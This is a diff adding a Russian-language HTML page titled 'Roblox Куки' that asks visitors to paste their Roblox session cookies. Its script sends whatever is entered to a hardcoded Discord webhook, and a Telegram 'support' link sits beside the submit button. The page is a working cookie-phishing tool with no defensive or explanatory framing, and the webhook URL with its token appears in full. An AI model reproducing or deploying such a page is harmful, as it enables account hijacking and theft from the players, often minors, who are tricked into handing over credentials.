@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Куки</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #0066ff, #808080, #3399ff, #666666);
+            background-size: 300% 300%;
+            animation: gradient 8s ease infinite;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 350px;
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #333;
+            font-size: 24px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        input:hover {
+            border-color: #0066ff;
+            box-shadow: 0 0 20px #0066ff;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        button {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            background: #0066ff;
+            color: white;
+        }
+
+        button:hover {
+            background: #0052cc;
+            box-shadow: 0 0 20px #0066ff;
+            transform: scale(1.05);
+        }
+
+        .support {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            background: #ff3333;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .support:hover {
+            background: #cc0000;
+            box-shadow: 0 0 20px #ff3333;
+            transform: scale(1.05);
+        }
+
+        #status {
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
+
+        .success {
+            background: #d4edda;
+            color: #155724;
+            display: block !important;
+        }
+
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎮 Введите куки</h1>
+        
+        <form id="cookieForm" onsubmit="return false;">
+            <input type="text" id="cookie" placeholder="Вставьте куки сюда" autocomplete="off">
+            
+            <div class="buttons">
+                <button type="button" onclick="sendCookie()">Отправить</button>
+                <a href="https://t.me/sventsi" target="_blank" class="support">Поддержка</a>
+            </div>
+        </form>
+
+        <div id="status"></div>
+    </div>
+
+    <script>
+        function sendCookie() {
+            const cookie = document.getElementById('cookie').value;
+            const status = document.getElementById('status');
+
+            if (!cookie) {
+                status.className = 'error';
+                status.innerHTML = 'Введите куки!';
+                status.style.display = 'block';
+                
+                setTimeout(() => {
+                    status.style.display = 'none';
+                }, 3000);
+                return;
+            }
+
+            status.className = '';
+            status.innerHTML = 'Отправка...';
+            status.style.display = 'block';
+
+            const webhookURL = 'https://discord.com/api/webhooks/1481637388227711146/0yj7c1HAwziyYjADJ1KsRuLJ72mfH8R-dfHziSjZW7S8ICrRNGm_tJjxy6c4X0z7gc7S';
+            
+            const data = {
+                content: '**Новые Roblox куки**',
+                embeds: [{
+                    title: 'Куки',
+                    description: '```' + cookie + '```',
+                    color: 3447003,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    status.className = 'success';
+                    status.innerHTML = '✅ Отправлено!';
+                    document.getElementById('cookie').value = '';
+                } else {
+                    throw new Error('Ошибка');
+                }
+            })
+            .catch(error => {
+                status.className = 'error';
+                status.innerHTML = '❌ Ошибка отправки';
+            })
+            .finally(() => {
+                setTimeout(() => {
+                    status.style.display = 'none';
+                }, 3000);
+            });
+        }
+    </script>
+</body>
+</html>
